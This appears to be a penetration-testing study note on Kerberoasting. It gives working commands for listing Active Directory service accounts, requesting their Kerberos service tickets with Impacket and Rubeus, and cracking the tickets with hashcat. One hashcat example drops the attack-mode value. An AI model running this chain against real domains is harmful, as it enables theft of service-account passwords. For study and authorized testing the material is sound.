# Kerberoasting (TGS-REP roasting)

{% embed url="https://www.techcrafters.com/portal/en/kb/articles/how-to-list-all-spns-in-a-domain-using-powershell#2__Querying_SPNs" %}

{% embed url="https://www.ibm.com/think/topics/kerberoasting" %}

{% embed url="https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adserviceaccount?view=windowsserver2025-ps" %}

### What is Kerberoasting?

Kerberoasting (also known as **TGS-REP roasting**) relies on the fact that a Ticket Granting Service (TGS) created for a service will be encrypted with a hash derived from the password of the associated service account. This allows an attacker to perform a dictionary attack to potentially crack the passwords of service accounts linked to services defined by the Service Principal Names (SPNs).

**TGS-REP** refers to the **Kerberos ticket-granting service (TGS) response** message, where the KDC validates the TGT, and if valid, responds with a service ticket (TGS) encrypted with the target service account's key.

### (1) Retrieve a list of SPNs in the network

1. `Get-ADServiceAccount` cmdlet

{% code overflow="wrap" %}
```powershell
PS> Get-ADServiceAccount -Filter 'ServicePrincipalNames -like "*"' | Select-Object -ExpandProperty ServicePrincipalNames
```
{% endcode %}

2. Impacket-scripts: **GetUserSPNs**

{% code overflow="wrap" %}
```sh
$ impacket-GetUserSPNs -dc-ip <DOMAIN_CONTROLLER> <TARGET>
```
{% endcode %}

* `<TARGET>:` The domain user account to authenticate to the KDC with
  * By default, all domain users can read the `servicePrinicpalName` attribute (required by the script)
  * Thus, as long as a valid user account is provided, it will not affect the results of the script

### (2) Retrieve the TGS for the SPNs we have found

1. &#x20;`impacket-GetUserSPNs` with the `-request-user` flag

{% code overflow="wrap" %}
```sh
$ impacket-GetUserSPNs -dc-ip <DOMAIN_CONTROLLER> <TARGET> -request-user <SERVICE_USER> 
```
{% endcode %}

* `-request-user:` Requests TGS for the SPN associated to the user specified (just the username, no domain needed)

2. `Rubeus.exe`

{% code overflow="wrap" %}
```powershell
C:\> Rubeus.exe kerberoast /spn:<SPN> /ticket:<EXISTING_TGT> 
C:\> Rubeus.exe kerberoast /user:<USERNAME> /ticket:EXISTING_TGT 
```
{% endcode %}

* `/ticket:` Specifies the TGT to use when requesting the service tickets
* `/spn:` Roasts just the specified SPN
* `/user:` Roasts just the specified user

**Other useful flags**

a. `/outfile:FILE:` outputs roasted hashes to the specified file, one per line

b. `/simple:` roasted hashes will be output to the console, one per line

**Combined command**

Or, we can directly enumerate the SPNs and request for the associated TGS all in one command:

{% code overflow="wrap" %}
```powershell
C:\> Rubeus.exe kerberoast
```
{% endcode %}

### (3) Perform dictionary attack on the obtained TGS

```sh
$ hashcat -a 0 -m 13100 <path_to_spn_hash> <wordlist>
# eg. 
$ echo xxx > spn.hash 
$ hashcat -a -m 13100 spn.hash /usr/share/wordlist/rockyou.txt
```

* `-a`: Attack mode&#x20;
  * `-a 0`: Dictionary attack&#x20;
* `-m` : Hash mode&#x20;
  * `-m 13100`: **Kerberos 5, etype 23, TGS-REP**

